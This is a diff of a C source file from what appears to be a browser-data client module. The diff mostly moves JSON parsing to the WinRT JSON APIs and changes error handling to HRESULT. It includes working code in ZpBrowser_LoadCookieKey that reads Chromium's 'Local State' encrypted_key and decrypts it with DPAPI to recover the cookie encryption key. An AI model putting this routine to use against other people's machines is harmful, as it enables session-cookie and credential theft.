@@ -1,11 +1,12 @@
 ﻿#include "Client.h"
 
-#include "../../KNSoft.ZPigeon.Client.SDK/Core/Json.h"
+#include <KNSoft/MakeLifeEasier/Data/Json.h>
 #include "../../KNSoft.ZPigeon.Client.SDK/Core/Snapshot.h"
 
 #include <KNSoft/MakeLifeEasier/MakeLifeEasier.h>
 #include <bcrypt.h>
 #include <dpapi.h>
+#include <roapi.h>
 #include <winsqlite/winsqlite3.h>
 #include <strsafe.h>
 
@@ -930,10 +931,10 @@ ZpBrowser_ColumnText(
 }
 
 static
-NTSTATUS
+HRESULT
 ZpBrowser_OpenJsonDocument(
     _In_ PCWSTR Path,
-    _Outptr_ PZP_JSON_VALUE* Value);
+    _Outptr_ IJsonValue** Value);
 
 static
 NTSTATUS
@@ -960,7 +961,7 @@ ZpBrowser_Utf8ToString(
 }
 
 static
-NTSTATUS
+HRESULT
 ZpBrowser_LoadCookieKey(
     _In_ ZP_BROWSER_TYPE Browser,
     _In_ PCWSTR UserData,
@@ -968,37 +969,37 @@ ZpBrowser_LoadCookieKey(
 {
     DATA_BLOB Input, Output = { 0 };
     WCHAR Path[MAX_PATH];
-    PZP_JSON_VALUE Root = NULL, OsCrypt = NULL, EncryptedKey = NULL;
+    IJsonValue* Root = NULL;
+    IJsonObject* RootObject = NULL;
+    IJsonObject* OsCrypt = NULL;
+    HSTRING_HEADER NameHeader;
+    HSTRING Name;
     HSTRING EncodedString = NULL;
     PCWSTR EncodedText;
     PBYTE Encoded = NULL;
-    UINT32 EncodedTextLength;
+    ULONG EncodedTextLength;
     DWORD EncodedLength = 0, EncodedCapacity = 0;
-    NTSTATUS Status;
+    HRESULT Result;
 
     Key->Length = 0;
     Key->V20Length = 0;
     Key->V20Attempted = FALSE;
-    Status = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\Local State", UserData);
-    if (!NT_SUCCESS(Status)) return Status;
-    Status = ZpBrowser_OpenJsonDocument(Path, &Root);
-    if (NT_SUCCESS(Status))
-    {
-        Status = ZpJson_GetNamedValue(Root,
-                                      L"os_crypt",
-                                      ARRAYSIZE(L"os_crypt") - 1,
-                                      &OsCrypt);
-    }
-    if (NT_SUCCESS(Status))
-    {
-        Status = ZpJson_GetNamedValue(OsCrypt,
-                                      L"encrypted_key",
-                                      ARRAYSIZE(L"encrypted_key") - 1,
-                                      &EncryptedKey);
-    }
-    if (NT_SUCCESS(Status)) Status = ZpJson_GetString(EncryptedKey, &EncodedString);
-    if (!NT_SUCCESS(Status)) goto Cleanup;
-    EncodedText = WindowsGetStringRawBuffer(EncodedString, &EncodedTextLength);
+    Result = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\Local State", UserData);
+    if (FAILED(Result)) return Result;
+    Result = ZpBrowser_OpenJsonDocument(Path, &Root);
+    if (FAILED(Result)) goto Cleanup;
+    Result = Root->lpVtbl->GetObject(Root, &RootObject);
+    if (FAILED(Result)) goto Cleanup;
+    Result = _Inline_WindowsCreateStringReference(L"os_crypt", _STR_LEN(L"os_crypt"), &NameHeader, &Name);
+    if (FAILED(Result)) goto Cleanup;
+    Result = RootObject->lpVtbl->GetNamedObject(RootObject, Name, &OsCrypt);
+    if (FAILED(Result)) goto Cleanup;
+    Result = _Inline_WindowsCreateStringReference(L"encrypted_key", _STR_LEN(L"encrypted_key"),
+                                                 &NameHeader, &Name);
+    if (FAILED(Result)) goto Cleanup;
+    Result = OsCrypt->lpVtbl->GetNamedString(OsCrypt, Name, &EncodedString);
+    if (FAILED(Result)) goto Cleanup;
+    EncodedText = _Inline_WindowsGetStringRawBuffer(EncodedString, &EncodedTextLength);
     if (!CryptStringToBinaryW(EncodedText,
                               EncodedTextLength,
                               CRYPT_STRING_BASE64,
@@ -1007,14 +1008,14 @@ ZpBrowser_LoadCookieKey(
                               NULL,
                               NULL))
     {
-        Status = NTSTATUS_FROM_WIN32(GetLastError());
+        Result = HRESULT_FROM_WIN32(GetLastError());
         goto Cleanup;
     }
     EncodedCapacity = EncodedLength;
     Encoded = Mem_Alloc(EncodedLength);
     if (Encoded == NULL)
     {
-        Status = STATUS_NO_MEMORY;
+        Result = E_OUTOFMEMORY;
         goto Cleanup;
     }
     if (!CryptStringToBinaryW(EncodedText,
@@ -1025,11 +1026,11 @@ ZpBrowser_LoadCookieKey(
                               NULL,
                               NULL))
     {
-        Status = NTSTATUS_FROM_WIN32(GetLastError());
+        Result = HRESULT_FROM_WIN32(GetLastError());
     }
     else if (EncodedLength <= 5 || !RtlEqualMemory(Encoded, "DPAPI", 5))
     {
-        Status = STATUS_NOT_SUPPORTED;
+        Result = E_NOTIMPL;
     }
     else
     {
@@ -1037,17 +1038,17 @@ ZpBrowser_LoadCookieKey(
         Input.cbData = EncodedLength - 5;
         if (!CryptUnprotectData(&Input, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &Output))
         {
-            Status = NTSTATUS_FROM_WIN32(GetLastError());
+            Result = HRESULT_FROM_WIN32(GetLastError());
         }
         else if (Output.cbData != sizeof(Key->Data))
         {
-            Status = STATUS_DATA_ERROR;
+            Result = HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
         }
         else
         {
             RtlCopyMemory(Key->Data, Output.pbData, Output.cbData);
             Key->Length = Output.cbData;
-            Status = STATUS_SUCCESS;
+            Result = S_OK;
         }
     }
 Cleanup:
@@ -1061,11 +1062,11 @@ Cleanup:
         RtlSecureZeroMemory(Encoded, EncodedCapacity);
         Mem_Free(Encoded);
     }
-    WindowsDeleteString(EncodedString);
-    ZpJson_CloseValue(EncryptedKey);
-    ZpJson_CloseValue(OsCrypt);
-    ZpJson_CloseValue(Root);
-    return Status;
+    _Inline_WindowsDeleteString(EncodedString);
+    if (RootObject != NULL) RootObject->lpVtbl->Release(RootObject);
+    if (OsCrypt != NULL) OsCrypt->lpVtbl->Release(OsCrypt);
+    if (Root != NULL) Root->lpVtbl->Release(Root);
+    return Result;
 }
 
 /* lazily fetch the App-Bound Encryption key on the first v20 record:
@@ -1512,27 +1513,27 @@ ZpBrowser_QueryDatabase(
 }
 
 static
-NTSTATUS
+HRESULT
 ZpBrowser_OpenJsonDocument(
     _In_ PCWSTR Path,
-    _Outptr_ PZP_JSON_VALUE* Value)
+    _Outptr_ IJsonValue** Value)
 {
-    return ZpJson_ParseUtf8File(Path, ZP_BROWSER_DOCUMENT_MAX_SIZE, Value);
+    return Data_JsonParseUtf8File(Path, ZP_BROWSER_DOCUMENT_MAX_SIZE, Value);
 }
 
 static
 LOGICAL
 ZpBrowser_IsDocumentMissing(
-    _In_ NTSTATUS Status)
+    _In_ HRESULT Result)
 {
-    return Status == STATUS_NO_SUCH_FILE ||
-           Status == STATUS_OBJECT_NAME_NOT_FOUND ||
-           Status == STATUS_OBJECT_PATH_NOT_FOUND;
+    return Result == HRESULT_FROM_NT(STATUS_NO_SUCH_FILE) ||
+           Result == HRESULT_FROM_NT(STATUS_OBJECT_NAME_NOT_FOUND) ||
+           Result == HRESULT_FROM_NT(STATUS_OBJECT_PATH_NOT_FOUND);
 }
 
 typedef struct _ZP_BROWSER_JSON_NODE
 {
-    PZP_JSON_VALUE Value;
+    IJsonValue* Value;
     ULONG ParentId;
     ULONG ChildIndex;
     ZP_BROWSER_DOCUMENT_TYPE Type;
@@ -1541,6 +1542,7 @@ typedef struct _ZP_BROWSER_JSON_NODE
 typedef struct _ZP_BROWSER_DOCUMENT_SNAPSHOT
 {
     ZP_CLIENT_SNAPSHOT Header;
+    CO_MTA_USAGE_COOKIE MtaUsage;
     RTL_SRWLOCK Lock;
     PZP_BROWSER_JSON_NODE Nodes;
     PULONG NodeIndex;
@@ -1562,47 +1564,86 @@ ZpBrowser_DeleteDocumentSnapshot(
 
     for (Index = 0; Index < Snapshot->NodeCount; Index++)
     {
-        ZpJson_CloseValue(Snapshot->Nodes[Index].Value);
+        Snapshot->Nodes[Index].Value->lpVtbl->Release(Snapshot->Nodes[Index].Value);
     }
+    if (Snapshot->MtaUsage != NULL) CoDecrementMTAUsage(Snapshot->MtaUsage);
     Mem_Free(Snapshot->NodeIndex);
     Mem_Free(Snapshot->Nodes);
     Mem_Free(Snapshot);
 }
 
 static
-NTSTATUS
+HRESULT
 ZpBrowser_GetDocumentType(
-    _In_ PZP_JSON_VALUE Value,
+    _In_ IJsonValue* Value,
     _Out_ ZP_BROWSER_DOCUMENT_TYPE* Type)
 {
-    ZP_JSON_TYPE JsonType;
-    NTSTATUS Status = ZpJson_GetType(Value, &JsonType);
+    JsonValueType JsonType;
+    HRESULT Result = Value->lpVtbl->get_ValueType(Value, &JsonType);
 
-    if (!NT_SUCCESS(Status)) return Status;
+    if (FAILED(Result)) return Result;
     switch (JsonType)
     {
-    case ZpJsonObject:
+    case JsonValueType_Object:
         *Type = ZpBrowserDocumentObject;
         break;
-    case ZpJsonArray:
+    case JsonValueType_Array:
         *Type = ZpBrowserDocumentArray;
         break;
-    case ZpJsonString:
+    case JsonValueType_String:
         *Type = ZpBrowserDocumentString;
         break;
-    case ZpJsonNumber:
+    case JsonValueType_Number:
         *Type = ZpBrowserDocumentNumber;
         break;
-    case ZpJsonBoolean:
+    case JsonValueType_Boolean:
         *Type = ZpBrowserDocumentBoolean;
         break;
-    case ZpJsonNull:
+    case JsonValueType_Null:
         *Type = ZpBrowserDocumentNull;
         break;
     default:
-        return STATUS_DATA_ERROR;
+        return HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
     }
-    return STATUS_SUCCESS;
+    return S_OK;
+}
+
+static
+HRESULT
+ZpBrowser_GetDocumentChildCount(
+    _In_ PZP_BROWSER_JSON_NODE Node,
+    _Out_ PULONG Count)
+{
+    HRESULT Result;
+
+    if (Node->Type == ZpBrowserDocumentArray)
+    {
+        IJsonArray* Value;
+        IJsonVector* Array;
+
+        Result = Node->Value->lpVtbl->GetArray(Node->Value, &Value);
+        if (FAILED(Result)) return Result;
+        Result = Value->lpVtbl->QueryInterface(Value,
+                    &IID___FIVector_1_Windows__CData__CJson__CIJsonValue, (PVOID*)&Array);
+        Value->lpVtbl->Release(Value);
+        if (FAILED(Result)) return Result;
+        Result = Array->lpVtbl->get_Size(Array, Count);
+        Array->lpVtbl->Release(Array);
+    } else
+    {
+        IJsonObject* Value;
+        IJsonMap* Object;
+
+        Result = Node->Value->lpVtbl->GetObject(Node->Value, &Value);
+        if (FAILED(Result)) return Result;
+        Result = Value->lpVtbl->QueryInterface(Value,
+                    &IID___FIMap_2_HSTRING_Windows__CData__CJson__CIJsonValue, (PVOID*)&Object);
+        Value->lpVtbl->Release(Value);
+        if (FAILED(Result)) return Result;
+        Result = Object->lpVtbl->get_Size(Object, Count);
+        Object->lpVtbl->Release(Object);
+    }
+    return Result;
 }
 
 static
@@ -1689,7 +1730,7 @@ static
 NTSTATUS
 ZpBrowser_AddDocumentNode(
     _Inout_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
-    _In_ PZP_JSON_VALUE Value,
+    _In_ IJsonValue* Value,
     _In_ ZP_BROWSER_DOCUMENT_TYPE Type,
     _In_ ULONG ParentId,
     _In_ ULONG ChildIndex,
@@ -1727,7 +1768,7 @@ ZpBrowser_AddDocumentNode(
 }
 
 static
-NTSTATUS
+HRESULT
 ZpBrowser_EncodeDocumentSnapshotPage(
     _In_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
     _In_ ULONG NodeId,
@@ -1739,120 +1780,189 @@ ZpBrowser_EncodeDocumentSnapshotPage(
     ZP_BROWSER_DOCUMENT_NODE Records[ZP_BROWSER_DOCUMENT_PAGE_SIZE] = { 0 };
     HSTRING Names[ZP_BROWSER_DOCUMENT_PAGE_SIZE] = { 0 };
     HSTRING Values[ZP_BROWSER_DOCUMENT_PAGE_SIZE] = { 0 };
-    PZP_JSON_ITERATOR Iterator = NULL;
-    PZP_JSON_VALUE Child;
+    IJsonVector* Array = NULL;
+    IJsonMap* Object = NULL;
+    IJsonIterator* Iterator = NULL;
+    boolean HasCurrent;
+    IJsonValue* Child;
     PZP_BROWSER_JSON_NODE Parent, Node;
     PBYTE Buffer;
     HSTRING Name;
-    ZP_BROWSER_DOCUMENT_TYPE Type;
-    UINT32 NameLength, ValueLength;
+    ZP_BROWSER_DOCUMENT_TYPE Type, ParentType;
+    ULONG NameLength, ValueLength;
     ULONG ChildCount, ChildSize, ChildIndex;
     ULONG Count, Index, PageCount, EncodedLength, NextCursor = 0;
-    NTSTATUS Status;
+    HRESULT Result;
 
     RtlAcquireSRWLockExclusive(&Snapshot->Lock);
     if (NodeId == 0 || NodeId > Snapshot->NodeCount)
     {
-        Status = STATUS_INVALID_PARAMETER;
+        Result = E_INVALIDARG;
         goto Cleanup;
     }
     Parent = &Snapshot->Nodes[NodeId - 1];
-    Status = ZpJson_GetSize(Parent->Value, &ChildCount);
-    if (!NT_SUCCESS(Status)) goto Cleanup;
+    ParentType = Parent->Type;
+    if (ParentType == ZpBrowserDocumentArray)
+    {
+        IJsonArray* Value;
+
+        Result = Parent->Value->lpVtbl->GetArray(Parent->Value, &Value);
+        if (FAILED(Result)) goto Cleanup;
+        Result = Value->lpVtbl->QueryInterface(Value,
+                    &IID___FIVector_1_Windows__CData__CJson__CIJsonValue, (PVOID*)&Array);
+        Value->lpVtbl->Release(Value);
+        if (SUCCEEDED(Result)) Result = Array->lpVtbl->get_Size(Array, &ChildCount);
+    } else if (ParentType == ZpBrowserDocumentObject)
+    {
+        IJsonObject* Value;
+
+        Result = Parent->Value->lpVtbl->GetObject(Parent->Value, &Value);
+        if (FAILED(Result)) goto Cleanup;
+        Result = Value->lpVtbl->QueryInterface(Value,
+                    &IID___FIMap_2_HSTRING_Windows__CData__CJson__CIJsonValue, (PVOID*)&Object);
+        Value->lpVtbl->Release(Value);
+        if (SUCCEEDED(Result)) Result = Object->lpVtbl->get_Size(Object, &ChildCount);
+    } else
+    {
+        Result = TYPE_E_TYPEMISMATCH;
+    }
+    if (FAILED(Result)) goto Cleanup;
     if (Cursor > ChildCount)
     {
-        Status = STATUS_INVALID_PARAMETER;
+        Result = E_INVALIDARG;
         goto Cleanup;
     }
     PageCount = min(Limit, ChildCount - Cursor);
-    Status = ZpJson_CreateIterator(Parent->Value, Cursor, &Iterator);
-    if (!NT_SUCCESS(Status)) goto Cleanup;
+    if (ParentType == ZpBrowserDocumentObject)
+    {
+        IJsonIterable* Iterable;
+
+        Result = Object->lpVtbl->QueryInterface(Object,
+                    &IID___FIIterable_1___FIKeyValuePair_2_HSTRING_Windows__CData__CJson__CIJsonValue,
+                    (PVOID*)&Iterable);
+        if (FAILED(Result)) goto Cleanup;
+        Result = Iterable->lpVtbl->First(Iterable, &Iterator);
+        Iterable->lpVtbl->Release(Iterable);
+        if (FAILED(Result)) goto Cleanup;
+        for (Index = 0; Index < Cursor; Index++)
+        {
+            Result = Iterator->lpVtbl->MoveNext(Iterator, &HasCurrent);
+            if (FAILED(Result)) goto Cleanup;
+        }
+    }
     for (Count = 0; Count < PageCount; Count++)
     {
-        Status = ZpJson_IteratorNext(Iterator, &Name, &Child);
-        if (!NT_SUCCESS(Status))
+        if (Array != NULL)
         {
-            if (Status == STATUS_NO_MORE_ENTRIES) Status = STATUS_DATA_ERROR;
-            goto Cleanup;
+            Result = Array->lpVtbl->GetAt(Array, Cursor + Count, &Child);
+            Name = NULL;
+        } else
+        {
+            IJsonPair* Pair;
+
+            Result = Iterator->lpVtbl->get_Current(Iterator, &Pair);
+            if (FAILED(Result)) goto Cleanup;
+            Result = Pair->lpVtbl->get_Key(Pair, &Name);
+            if (FAILED(Result))
+            {
+                Pair->lpVtbl->Release(Pair);
+                goto Cleanup;
+            }
+            Result = Pair->lpVtbl->get_Value(Pair, &Child);
+            Pair->lpVtbl->Release(Pair);
+            if (FAILED(Result))
+            {
+                _Inline_WindowsDeleteString(Name);
+                goto Cleanup;
+            }
+            Result = Iterator->lpVtbl->MoveNext(Iterator, &HasCurrent);
+            if (FAILED(Result))
+            {
+                Child->lpVtbl->Release(Child);
+                _Inline_WindowsDeleteString(Name);
+            }
         }
+        if (FAILED(Result)) goto Cleanup;
         Names[Count] = Name;
         ChildIndex = Cursor + Count;
         Records[Count].Id = ZpBrowser_FindDocumentNode(Snapshot, NodeId, ChildIndex);
         if (Records[Count].Id == 0)
         {
-            Status = ZpBrowser_GetDocumentType(Child, &Type);
-            if (NT_SUCCESS(Status))
+            Result = ZpBrowser_GetDocumentType(Child, &Type);
+            if (SUCCEEDED(Result))
             {
-                Status = ZpBrowser_AddDocumentNode(Snapshot,
+                Result = HRESULT_FROM_NT(ZpBrowser_AddDocumentNode(Snapshot,
                                                    Child,
                                                    Type,
                                                    NodeId,
                                                    ChildIndex,
-                                                   &Records[Count].Id);
+                                                   &Records[Count].Id));
             }
-            if (!NT_SUCCESS(Status))
+            if (FAILED(Result))
             {
-                ZpJson_CloseValue(Child);
+                Child->lpVtbl->Release(Child);
                 goto Cleanup;
             }
         }
         else
         {
-            ZpJson_CloseValue(Child);
+            Child->lpVtbl->Release(Child);
         }
         Node = &Snapshot->Nodes[Records[Count].Id - 1];
         Records[Count].Type = Node->Type;
-        Records[Count].Name = WindowsGetStringRawBuffer(Names[Count], &NameLength);
+        Records[Count].Name = _Inline_WindowsGetStringRawBuffer(Names[Count], &NameLength);
         Records[Count].NameLength = NameLength;
         if (Node->Type == ZpBrowserDocumentObject || Node->Type == ZpBrowserDocumentArray)
         {
-            Status = ZpJson_GetSize(Node->Value, &ChildSize);
-            if (!NT_SUCCESS(Status)) goto Cleanup;
+            Result = ZpBrowser_GetDocumentChildCount(Node, &ChildSize);
+            if (FAILED(Result)) goto Cleanup;
             Records[Count].Flags = ChildSize != 0 ? ZP_BROWSER_DOCUMENT_NODE_HAS_CHILDREN : 0;
         }
         else
         {
-            Status = ZpJson_Stringify(Node->Value, &Values[Count]);
-            if (!NT_SUCCESS(Status)) goto Cleanup;
-            Records[Count].Value = WindowsGetStringRawBuffer(Values[Count], &ValueLength);
+            Result = Node->Value->lpVtbl->Stringify(Node->Value, &Values[Count]);
+            if (FAILED(Result)) goto Cleanup;
+            Records[Count].Value = _Inline_WindowsGetStringRawBuffer(Values[Count], &ValueLength);
             Records[Count].ValueLength = ValueLength;
         }
     }
     if (Cursor + Count < ChildCount) NextCursor = Cursor + Count;
-    Status = ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
-                                         Parent->Type,
+    Result = HRESULT_FROM_NT(ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
+                                         ParentType,
                                          NextCursor,
                                          Records,
                                          Count,
                                          NULL,
                                          0,
-                                         &EncodedLength);
-    if (!NT_SUCCESS(Status)) goto Cleanup;
+                                         &EncodedLength));
+    if (FAILED(Result)) goto Cleanup;
     Buffer = Mem_Alloc(EncodedLength);
     if (Buffer == NULL)
     {
-        Status = STATUS_NO_MEMORY;
+        Result = E_OUTOFMEMORY;
         goto Cleanup;
     }
-    Status = ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
-                                         Parent->Type,
+    Result = HRESULT_FROM_NT(ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
+                                         ParentType,
                                          NextCursor,
                                          Records,
                                          Count,
                                          Buffer,
                                          EncodedLength,
-                                         ResponseLength);
-    if (NT_SUCCESS(Status)) *Response = Buffer;
+                                         ResponseLength));
+    if (SUCCEEDED(Result)) *Response = Buffer;
     else Mem_Free(Buffer);
 Cleanup:
-    ZpJson_CloseIterator(Iterator);
+    if (Iterator != NULL) Iterator->lpVtbl->Release(Iterator);
+    if (Array != NULL) Array->lpVtbl->Release(Array);
+    if (Object != NULL) Object->lpVtbl->Release(Object);
     for (Index = 0; Index < ZP_BROWSER_DOCUMENT_PAGE_SIZE; Index++)
     {
-        WindowsDeleteString(Values[Index]);
-        WindowsDeleteString(Names[Index]);
+        _Inline_WindowsDeleteString(Values[Index]);
+        _Inline_WindowsDeleteString(Names[Index]);
     }
     RtlReleaseSRWLockExclusive(&Snapshot->Lock);
-    return Status;
+    return Result;
 }
 
 static
@@ -1866,51 +1976,58 @@ ZpBrowser_OpenDocument(
 {
     static const BYTE EmptyObject[] = "{}";
     PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot;
-    PZP_JSON_VALUE Root = NULL;
+    IJsonValue* Root = NULL;
     ZP_BROWSER_DOCUMENT_TYPE RootType;
     ULONG RootId;
-    NTSTATUS Status;
+    HRESULT Result;
 
     Snapshot = Mem_Alloc(sizeof(*Snapshot));
     if (Snapshot == NULL) return ZpStatus_FromNtStatus(STATUS_NO_MEMORY);
     RtlZeroMemory(Snapshot, sizeof(*Snapshot));
-    Status = ZpBrowser_OpenJsonDocument(Path, &Root);
-    if (MissingAllowed && ZpBrowser_IsDocumentMissing(Status))
+    // Keep the MTA alive while JSON values are retained between requests.
+    Result = CoIncrementMTAUsage(&Snapshot->MtaUsage);
+    if (FAILED(Result))
     {
-        Status = ZpJson_ParseUtf8(EmptyObject, sizeof(EmptyObject) - 1, &Root);
+        Mem_Free(Snapshot);
+        return ZpStatus_FromCode(ZpStatusHResult, Result);
     }
-    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetDocumentType(Root, &RootType);
-    if (NT_SUCCESS(Status) &&
+    Result = ZpBrowser_OpenJsonDocument(Path, &Root);
+    if (MissingAllowed && ZpBrowser_IsDocumentMissing(Result))
+    {
+        Result = Data_JsonParseUtf8(EmptyObject, sizeof(EmptyObject) - 1, &Root);
+    }
+    if (SUCCEEDED(Result)) Result = ZpBrowser_GetDocumentType(Root, &RootType);
+    if (SUCCEEDED(Result) &&
         RootType != ZpBrowserDocumentObject && RootType != ZpBrowserDocumentArray)
     {
-        Status = STATUS_OBJECT_TYPE_MISMATCH;
+        Result = TYPE_E_TYPEMISMATCH;
     }
-    if (NT_SUCCESS(Status))
+    if (SUCCEEDED(Result))
     {
-        Status = ZpBrowser_AddDocumentNode(Snapshot, Root, RootType, 0, 0, &RootId);
-        if (NT_SUCCESS(Status)) Root = NULL;
+        Result = HRESULT_FROM_NT(ZpBrowser_AddDocumentNode(Snapshot, Root, RootType, 0, 0, &RootId));
+        if (SUCCEEDED(Result)) Root = NULL;
     }
-    if (!NT_SUCCESS(Status))
+    if (FAILED(Result))
     {
-        ZpJson_CloseValue(Root);
+        if (Root != NULL) Root->lpVtbl->Release(Root);
         ZpBrowser_DeleteDocumentSnapshot(&Snapshot->Header);
-        return ZpStatus_FromNtStatus(Status);
+        return ZpStatus_FromCode(ZpStatusHResult, Result);
     }
     ZpClientSnapshot_Add(Client,
                          &Snapshot->Header,
                          ZP_BROWSER_MODULE_ID,
                          ZpBrowser_DeleteDocumentSnapshot);
-    Status = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
+    Result = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
                                                   RootId,
                                                   0,
                                                   ZP_BROWSER_DOCUMENT_PAGE_SIZE,
                                                   Response,
                                                   ResponseLength);
-    if (!NT_SUCCESS(Status))
+    if (FAILED(Result))
     {
         ZpClientSnapshot_Close(Client, ZP_BROWSER_MODULE_ID, Snapshot->Header.Id);
     }
-    return ZpStatus_FromNtStatus(Status);
+    return ZpStatus_FromCode(ZpStatusHResult, Result);
 }
 
 static
@@ -1926,17 +2043,17 @@ ZpBrowser_QueryDocumentNode(
 {
     PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot = (PZP_BROWSER_DOCUMENT_SNAPSHOT)
         ZpClientSnapshot_Reference(Client, ZP_BROWSER_MODULE_ID, SnapshotId);
-    NTSTATUS Status;
+    HRESULT Result;
 
     if (Snapshot == NULL) return ZpStatus_FromNtStatus(STATUS_NOT_FOUND);
-    Status = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
+    Result = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
                                                   NodeId,
                                                   Cursor,
                                                   Limit,
                                                   Response,
                                                   ResponseLength);
     ZpClientSnapshot_Dereference(&Snapshot->Header);
-    return ZpStatus_FromNtStatus(Status);
+    return ZpStatus_FromCode(ZpStatusHResult, Result);
 }
 
 static
@@ -1948,18 +2065,18 @@ ZpBrowser_QueryDocument(
     _Out_ PULONG ResponseLength)
 {
     ZP_BROWSER_BUILDER Builder = { 0 };
-    PZP_JSON_VALUE Root = NULL;
+    IJsonValue* Root = NULL;
     HSTRING Text = NULL;
-    NTSTATUS Status;
+    HRESULT Result;
 
-    Status = ZpBrowser_OpenJsonDocument(Path, &Root);
-    if (Query->Kind == ZpBrowserKindBookmark && ZpBrowser_IsDocumentMissing(Status)) Status = STATUS_SUCCESS;
-    else if (NT_SUCCESS(Status))
+    Result = ZpBrowser_OpenJsonDocument(Path, &Root);
+    if (Query->Kind == ZpBrowserKindBookmark && ZpBrowser_IsDocumentMissing(Result)) Result = S_OK;
+    else if (SUCCEEDED(Result))
     {
-        Status = ZpJson_Stringify(Root, &Text);
-        if (NT_SUCCESS(Status))
+        Result = Root->lpVtbl->Stringify(Root, &Text);
+        if (SUCCEEDED(Result))
         {
-            Status = ZpBrowser_AddRecord(&Builder,
+            Result = HRESULT_FROM_NT(ZpBrowser_AddRecord(&Builder,
                                          Query->Kind,
                                          Query->Browser,
                                          0,
@@ -1967,14 +2084,14 @@ ZpBrowser_QueryDocument(
                                          L"",
                                          NULL,
                                          Path,
-                                         WindowsGetStringRawBuffer(Text, NULL));
+                                         _Inline_WindowsGetStringRawBuffer(Text, NULL)));
         }
     }
-    WindowsDeleteString(Text);
-    ZpJson_CloseValue(Root);
-    if (NT_SUCCESS(Status)) Status = ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength);
+    _Inline_WindowsDeleteString(Text);
+    if (Root != NULL) Root->lpVtbl->Release(Root);
+    if (SUCCEEDED(Result)) Result = HRESULT_FROM_NT(ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength));
     ZpBrowser_FreeBuilder(&Builder);
-    return ZpStatus_FromNtStatus(Status);
+    return ZpStatus_FromCode(ZpStatusHResult, Result);
 }
 
 static
@@ -2103,8 +2220,9 @@ ZpBrowser_OpenDocumentQuery(
                ZpStatus_FromNtStatus(Status);
 }
 
+static
 ZP_STATUS
-ZpBrowser_Execute(
+ZpBrowser_ExecuteRequest(
     _Inout_ PZP_CLIENT_OBJECT Client,
     _In_ BYTE OperationId,
     _In_reads_bytes_opt_(RequestLength) const VOID* Request,
@@ -2174,4 +2292,22 @@ ZpBrowser_Execute(
                                     ZpStatus_FromNtStatus(Status);
     }
     return ZpStatus_FromNtStatus(STATUS_NOT_SUPPORTED);
+}
+
+ZP_STATUS
+ZpBrowser_Execute(
+    _Inout_ PZP_CLIENT_OBJECT Client,
+    _In_ BYTE OperationId,
+    _In_reads_bytes_opt_(RequestLength) const VOID* Request,
+    _In_ ULONG RequestLength,
+    _Outptr_result_bytebuffer_maybenull_(*ResponseLength) PBYTE* Response,
+    _Out_ PULONG ResponseLength)
+{
+    HRESULT Result = RoInitialize(RO_INIT_MULTITHREADED);
+    ZP_STATUS Status;
+
+    if (FAILED(Result)) return ZpStatus_FromCode(ZpStatusHResult, Result);
+    Status = ZpBrowser_ExecuteRequest(Client, OperationId, Request, RequestLength, Response, ResponseLength);
+    RoUninitialize();
+    return Status;
 }
